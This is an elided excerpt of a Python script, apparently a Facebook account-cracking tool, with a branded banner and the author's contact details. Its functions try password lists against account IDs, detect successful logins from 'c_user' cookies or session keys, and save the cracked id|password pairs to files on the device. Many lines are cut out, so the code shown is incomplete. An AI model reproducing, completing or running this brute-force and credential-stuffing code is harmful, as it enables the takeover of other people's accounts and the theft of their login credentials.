#CYBER(SHAMIM FB KING 71)
#WhatsApp : 01325846157
#Github : SHAMIM-FB
from os import path
...
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝     ╚═╝
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : SHAMIM CYBER 71            
    │ [✓] GITHUB   : SHAMIM FB                
    │ [✓] WHATSAPP : +8801325846157         
    │ [✓] VERSION  : 0.2                    
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' Enter your  file name\033[1;37m: ')
		try:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [SHAMIM[🥰]-FB-CYBER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [SHAMIM[🥰]-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/SHAMIM[🥰]-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [SHAMIM[💔]-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SHAMIM[💔]-CP..txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [SHAMIM[🥰]-FB-CYBER] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SHAMIM[💔]-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SHAMIM[🥰]-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SHAMIM[🥰]-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[SHAMIM[🥰]-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[SHAMIM[💔]-CP] '+idf+' | '+ps+'\033[0;97m')
